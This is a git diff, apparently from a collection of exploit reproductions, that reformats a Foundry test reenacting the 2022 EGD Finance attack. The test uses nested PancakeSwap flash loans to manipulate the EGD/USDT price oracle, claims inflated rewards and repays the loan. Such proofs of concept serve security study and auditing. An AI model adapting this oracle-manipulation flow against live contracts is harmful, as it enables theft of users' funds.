@@ -46,12 +46,16 @@ contract Attacker is Test {
         console.log("Attacker Stake 100 USDT to EGD Finance");
 
         exploit.stake();
-        vm.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)
+        vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)
 
         console.log("-------------------------------- Start Exploit ----------------------------------");
         emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
-        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
-        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
+        emit log_named_decimal_uint(
+            "[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
+        );
+        emit log_named_decimal_uint(
+            "[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18
+        );
         console.log("Attacker manipulating price oracle of EGD Finance...");
 
         exploit.harvest();
@@ -107,19 +111,22 @@ contract Exploit is Test {
             require(suc, "Flashloan[1] payback failed");
         } else {
             console.log("Flashloan[2] received");
-            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
+            emit log_named_decimal_uint(
+                "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
+            );
             // -----------------------------------------------------------------
             console.log("Claim all EGD Token reward from EGD Finance contract");
             IEGD_Finance(EGD_Finance).claimAllReward();
             emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
             // -----------------------------------------------------------------
-            uint256 swapfee = (amount1 * 10000 / 9970) - amount1; // Attacker needs to pay >0.25% fee back to Pancakeswap
+            uint256 swapfee = (amount1 * 10_000 / 9970) - amount1; // Attacker needs to pay >0.25% fee back to Pancakeswap
             bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);
             require(suc, "Flashloan[2] payback failed");
         }
     }
 }
 /* -------------------- Interface -------------------- */
+
 interface IEGD_Finance {
     function bond(address invitor) external;
     function stake(uint256 amount) external;
